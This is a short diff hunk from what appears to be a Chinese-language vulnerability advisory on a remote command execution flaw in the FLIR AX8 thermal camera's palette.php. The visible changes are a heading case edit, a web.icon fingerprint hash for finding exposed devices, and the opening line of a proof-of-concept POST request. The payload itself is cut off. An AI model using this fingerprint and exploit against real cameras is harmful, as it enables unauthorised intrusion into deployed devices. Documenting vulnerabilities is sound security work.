@@ -8,7 +8,7 @@ FLIR-AX8热成像仪palette.php存在远程命令执行漏洞，允许攻击者�
 web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /palette.php HTTP/1.1
